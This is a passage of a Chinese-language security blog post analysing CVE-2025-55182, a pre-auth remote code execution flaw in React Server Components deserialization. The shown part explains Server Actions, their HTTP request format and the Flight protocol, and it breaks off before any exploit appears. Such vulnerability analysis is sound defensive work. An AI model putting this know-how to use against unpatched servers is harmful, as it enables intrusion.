<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" data-mode="dark">
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.4" />
<meta property="og:title" content="CVE-2025-55182 React Server Components 反序列化漏洞原理深度分析" />
<meta name="author" content="imjdl" />
<meta property="og:locale" content="en" />
<meta name="description" content="一、漏洞概述" />
<meta property="og:description" content="一、漏洞概述" />
<link rel="canonical" href="/posts/CVE-2025-55182/" />
<meta property="og:url" content="/posts/CVE-2025-55182/" />
<meta property="og:site_name" content="imjdl blog" />
<meta property="og:image" content="/assets/img/202555182/logo.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-12-05T11:33:00+08:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="/assets/img/202555182/logo.png" />
<meta property="twitter:title" content="CVE-2025-55182 React Server Components 反序列化漏洞原理深度分析" />
<meta name="twitter:site" content="@Mortyjin" />
<meta name="twitter:creator" content="@MortyJin" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"imjdl","url":"https://github.com/imjdl/"},"dateModified":"2025-12-05T11:33:00+08:00","datePublished":"2025-12-05T11:33:00+08:00","description":"一、漏洞概述","headline":"CVE-2025-55182 React Server Components 反序列化漏洞原理深度分析","image":"/assets/img/202555182/logo.png","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/CVE-2025-55182/"},"url":"/posts/CVE-2025-55182/"}</script>
<!-- End Jekyll SEO tag -->


  <title>CVE-2025-55182 React Server Components 反序列化漏洞原理深度分析 | imjdl blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="imjdl blog">
<meta name="application-name" content="imjdl blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Resource Hints -->
  
    
      
        <link rel="preconnect" href="https://fonts.googleapis.com" >
      
        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
      
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      
        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
      
    
      
        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      
        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
      
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
  

  <!-- Scripts -->

  <script src="/assets/js/dist/theme.min.js"></script>

  <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.32.2/dist/tocbot.min.js,npm/mermaid@11.4.0/dist/mermaid.min.js"></script>







<script defer src="/assets/js/dist/post.min.js"></script>


  <!-- MathJax -->
  <script async src="/assets/js/data/mathjax.js"></script>
  <script async src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6"></script>
  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-chtml.js"></script>


<!-- Pageviews -->

  

  



  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/favicons/log.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <a class="site-title d-block" href="/">imjdl blog</a>
    <p class="site-subtitle fst-italic mb-0">Perpetual student, continual incremental improvement.</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/tags/" class="nav-link">
            <i class="fa-fw fas fa-tags"></i>
            

            <span>TAGS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>ABOUT</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/reading-list/" class="nav-link">
            <i class="fa-fw fa fa-list-alt"></i>
            

            <span>READING LIST</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    

    
      

      
        <a
          href="https://github.com/imjdl"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    
      

      
        <a
          href="https://twitter.com/Mortyjin"
          aria-label="twitter"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fa-brands fa-x-twitter"></i>
        </a>
      
    
      

      
        <a
          href="javascript:location.href = 'mailto:' + ['imelloit','gmail.com'].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
      

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>CVE-2025-55182 React Server Components 反序列化漏洞原理深度分析</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search id="search" class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  




<!-- return -->










<article class="px-1" data-toc="true">
  <header>
    <h1 data-toc-skip>CVE-2025-55182 React Server Components 反序列化漏洞原理深度分析</h1>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1764905580"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Dec  5, 2025
</time>

      </span>

      <!-- lastmod date -->
      

      
        
        
        

        

        <div class="mt-3 mb-3">
          <a href="/assets/img/202555182/logo.png" class="popup img-link preview-img shimmer"><img src="/assets/img/202555182/logo.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              
                <a href="https://github.com/imjdl/">imjdl</a>
                
              
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="7337 words"
>
  <em>40 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  
    <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
      <span class="label text-truncate">CVE-2025-55182 React Server Components 反序列化漏洞原理深度分析</span>
      <button type="button" class="toc-trigger btn me-1">
        <i class="fa-solid fa-list-ul fa-fw"></i>
      </button>
    </div>

    <button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm">
      <span class="label ps-2 pe-1">Contents</span>
      <i class="fa-solid fa-angle-right fa-fw"></i>
    </button>

    <dialog id="toc-popup" class="p-0">
      <div class="header d-flex flex-row align-items-center justify-content-between">
        <div class="label text-truncate py-2 ms-4">CVE-2025-55182 React Server Components 反序列化漏洞原理深度分析</div>
        <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
          <i class="fas fa-close"></i>
        </button>
      </div>
      <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
    </dialog>
  

  <div class="content">
    <h2 id="一漏洞概述"><span class="me-2">一、漏洞概述</span><a href="#一漏洞概述" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="table-wrapper"><table>
  <thead>
    <tr>
      <th>项目</th>
      <th>内容</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>CVE编号</strong></td>
      <td>CVE-2025-55182</td>
    </tr>
    <tr>
      <td><strong>漏洞类型</strong></td>
      <td>远程代码执行 (RCE)</td>
    </tr>
    <tr>
      <td><strong>漏洞组件</strong></td>
      <td>React Flight Protocol (react-server-dom-webpack)</td>
    </tr>
    <tr>
      <td><strong>受影响版本</strong></td>
      <td>react-server-dom-webpack 19.0.0 - 19.2.0, Next.js 15.x/16.x</td>
    </tr>
    <tr>
      <td><strong>CVSS评分</strong></td>
      <td>9.8 (Critical)</td>
    </tr>
    <tr>
      <td><strong>认证要求</strong></td>
      <td>无需认证 (Pre-auth)</td>
    </tr>
  </tbody>
</table></div>

<hr />

<h2 id="二react-server-components-技术背景"><span class="me-2">二、React Server Components 技术背景</span><a href="#二react-server-components-技术背景" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="21-什么是-react-server-components-rsc"><span class="me-2">2.1 什么是 React Server Components (RSC)</span><a href="#21-什么是-react-server-components-rsc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>React Server Components 是 React 18+ 引入的一种新型组件模型，允许组件在服务端渲染并将结果流式传输到客户端。与传统 SSR 不同，RSC 可以：</p>

<ol>
  <li><strong>直接访问服务端资源</strong>：数据库、文件系统、内部 API</li>
  <li><strong>减少客户端 JavaScript 体积</strong>：服务端组件代码不会发送到客户端</li>
  <li><strong>保持交互性</strong>：与客户端组件无缝协作</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre>┌─────────────────────────────────────────────────────────────────┐
│                    React Server Components 架构                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌──────────────┐         ┌──────────────┐                      │
│  │   Browser    │ ←─────→ │   Server     │                      │
│  │              │  HTTP   │              │                      │
│  │ ┌──────────┐ │         │ ┌──────────┐ │                      │
│  │ │ Client   │ │         │ │ Server   │ │                      │
│  │ │Components│ │         │ │Components│ │                      │
│  │ └──────────┘ │         │ └──────────┘ │                      │
│  │      ↑       │         │      ↓       │                      │
│  │      │       │         │  ┌────────┐  │                      │
│  │      └───────┼─────────┼──│ Flight │  │                      │
│  │   Flight     │         │  │Protocol│  │                      │
│  │   Protocol   │         │  └────────┘  │                      │
│  └──────────────┘         └──────────────┘                      │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
</pre></td></tr></tbody></table></code></div></div>

<h3 id="22-什么是-react-server-functions-server-actions"><span class="me-2">2.2 什么是 React Server Functions (Server Actions)</span><a href="#22-什么是-react-server-functions-server-actions" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Server Functions（在 Next.js 中称为 Server Actions）是 React 19 引入的 <strong>RPC-over-HTTP</strong> 机制，允许客户端像调用本地函数一样调用服务端函数。</p>

<h4 id="221-server-function-定义方式"><span class="me-2">2.2.1 Server Function 定义方式</span><a href="#221-server-function-定义方式" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="c1">// app/actions.js</span>
<span class="dl">'</span><span class="s1">use server</span><span class="dl">'</span>  <span class="c1">// 标记为 Server Function</span>

<span class="k">export</span> <span class="k">async</span> <span class="kd">function</span> <span class="nf">submitForm</span><span class="p">(</span><span class="nx">formData</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// 这段代码只在服务端执行</span>
    <span class="kd">const</span> <span class="nx">name</span> <span class="o">=</span> <span class="nx">formData</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">name</span><span class="dl">'</span><span class="p">);</span>
    <span class="k">await</span> <span class="nx">db</span><span class="p">.</span><span class="nx">users</span><span class="p">.</span><span class="nf">create</span><span class="p">({</span> <span class="nx">name</span> <span class="p">});</span>
    <span class="k">return</span> <span class="p">{</span> <span class="na">success</span><span class="p">:</span> <span class="kc">true</span> <span class="p">};</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<h4 id="222-客户端调用方式"><span class="me-2">2.2.2 客户端调用方式</span><a href="#222-客户端调用方式" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="c1">// app/page.jsx (Client Component)</span>
<span class="dl">'</span><span class="s1">use client</span><span class="dl">'</span>
<span class="k">import</span> <span class="p">{</span> <span class="nx">submitForm</span> <span class="p">}</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">./actions</span><span class="dl">'</span><span class="p">;</span>

<span class="k">export</span> <span class="k">default</span> <span class="kd">function</span> <span class="nf">Form</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">async</span> <span class="kd">function</span> <span class="nf">handleSubmit</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">e</span><span class="p">.</span><span class="nf">preventDefault</span><span class="p">();</span>
        <span class="kd">const</span> <span class="nx">formData</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">FormData</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">target</span><span class="p">);</span>
        <span class="c1">// 看起来像本地调用，实际是 HTTP POST</span>
        <span class="kd">const</span> <span class="nx">result</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">submitForm</span><span class="p">(</span><span class="nx">formData</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="o">&lt;</span><span class="nx">form</span> <span class="nx">onSubmit</span><span class="o">=</span><span class="p">{</span><span class="nx">handleSubmit</span><span class="p">}</span><span class="o">&gt;</span><span class="p">...</span><span class="o">&lt;</span><span class="sr">/form&gt;</span><span class="err">;
</span><span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<h4 id="223-底层通信机制"><span class="me-2">2.2.3 底层通信机制</span><a href="#223-底层通信机制" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p>当客户端调用 <code class="language-plaintext highlighter-rouge">submitForm(formData)</code> 时，React 实际执行：</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>1. 客户端序列化参数 → Flight Protocol 格式
2. 发送 HTTP POST 请求到当前页面 URL
3. 请求头包含 Next-Action: &lt;action-id&gt;
4. 请求体是 multipart/form-data（Flight 格式）
5. 服务端反序列化参数
6. 执行对应的 Server Function
7. 序列化返回值 → Flight Protocol 格式
8. 客户端反序列化结果
</pre></td></tr></tbody></table></code></div></div>

<h3 id="23-server-action-请求格式详解"><span class="me-2">2.3 Server Action 请求格式详解</span><a href="#23-server-action-请求格式详解" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="231-http-请求结构"><span class="me-2">2.3.1 HTTP 请求结构</span><a href="#231-http-请求结构" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/page-url</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">example.com</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk</span>
<span class="na">Next-Action</span><span class="p">:</span> <span class="s">1a2b3c4d5e6f7890abcdef1234567890abcdef12</span>
<span class="na">Next-Router-State-Tree</span><span class="p">:</span> <span class="s">[encoded-tree]</span>

------WebKitFormBoundary7MA4YWxk
Content-Disposition: form-data; name="1_$ACTION_ID_1a2b3c..."

------WebKitFormBoundary7MA4YWxk
Content-Disposition: form-data; name="0"

["$K1"]
------WebKitFormBoundary7MA4YWxk--
</pre></td></tr></tbody></table></code></div></div>

<h4 id="232-关键-http-头"><span class="me-2">2.3.2 关键 HTTP 头</span><a href="#232-关键-http-头" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="table-wrapper"><table>
  <thead>
    <tr>
      <th>Header</th>
      <th>说明</th>
      <th>示例</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Next-Action</code></td>
      <td>Server Action 的唯一标识符（40字符哈希）</td>
      <td><code class="language-plaintext highlighter-rouge">1a2b3c4d...</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Content-Type</code></td>
      <td>必须是 <code class="language-plaintext highlighter-rouge">multipart/form-data</code></td>
      <td><code class="language-plaintext highlighter-rouge">multipart/form-data; boundary=...</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Next-Router-State-Tree</code></td>
      <td>路由状态（可选）</td>
      <td><code class="language-plaintext highlighter-rouge">[encoded]</code></td>
    </tr>
  </tbody>
</table></div>

<h4 id="233-action-id-的生成"><span class="me-2">2.3.3 Action ID 的生成</span><a href="#233-action-id-的生成" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p>Action ID 是 Server Function 的唯一标识符，由以下因素计算：</p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="c1">// Next.js 内部生成逻辑（简化）</span>
<span class="nx">actionId</span> <span class="o">=</span> <span class="nf">hash</span><span class="p">(</span>
    <span class="nx">filePath</span> <span class="o">+</span>          <span class="c1">// 文件路径: "app/actions.js"</span>
    <span class="nx">exportName</span> <span class="o">+</span>        <span class="c1">// 导出名: "submitForm"</span>
    <span class="nx">functionBody</span>        <span class="c1">// 函数体哈希</span>
<span class="p">);</span>
<span class="c1">// 结果: "1a2b3c4d5e6f7890abcdef1234567890abcdef12"</span>
</pre></td></tr></tbody></table></code></div></div>

<p><strong>tips</strong>: Next.js 只有知道有效 Action ID 的请求才是合法的。但 CVE-2025-55182 证明这个漏洞在验证 Action ID <strong>之前</strong>就触发了。</p>

<hr />

<h2 id="三react-flight-protocol-深度解析"><span class="me-2">三、React Flight Protocol 深度解析</span><a href="#三react-flight-protocol-深度解析" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="31-什么是-flight-protocol"><span class="me-2">3.1 什么是 Flight Protocol</span><a href="#31-什么是-flight-protocol" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Flight 是 React 团队设计的<strong>自定义流式序列化协议</strong>，用于在服务端和客户端之间传输 React 组件树、数据和引用。它是 React Server Components 的核心通信机制。</p>

<h4 id="311-设计目标"><span class="me-2">3.1.1 设计目标</span><a href="#311-设计目标" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="table-wrapper"><table>
  <thead>
    <tr>
      <th>目标</th>
      <th>说明</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>流式传输</strong></td>
      <td>支持边渲染边传输，无需等待完整响应</td>
    </tr>
    <tr>
      <td><strong>引用共享</strong></td>
      <td>相同数据只传输一次，通过 ID 引用</td>
    </tr>
    <tr>
      <td><strong>类型保留</strong></td>
      <td>保留 React 特有类型（Promise、组件、函数引用等）</td>
    </tr>
    <tr>
      <td><strong>紧凑高效</strong></td>
      <td>比纯 JSON 更紧凑，减少传输体积</td>
    </tr>
    <tr>
      <td><strong>双向支持</strong></td>
      <td>服务端→客户端（渲染）和客户端→服务端（Server Actions）</td>
    </tr>
  </tbody>
</table></div>

<h4 id="312-flight-vs-json"><span class="me-2">3.1.2 Flight vs JSON</span><a href="#312-flight-vs-json" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="c1">// 普通 JSON - 无法表示引用、Promise、函数等</span>
<span class="p">{</span>
    <span class="dl">"</span><span class="s2">user</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span><span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Alice</span><span class="dl">"</span><span class="p">},</span>
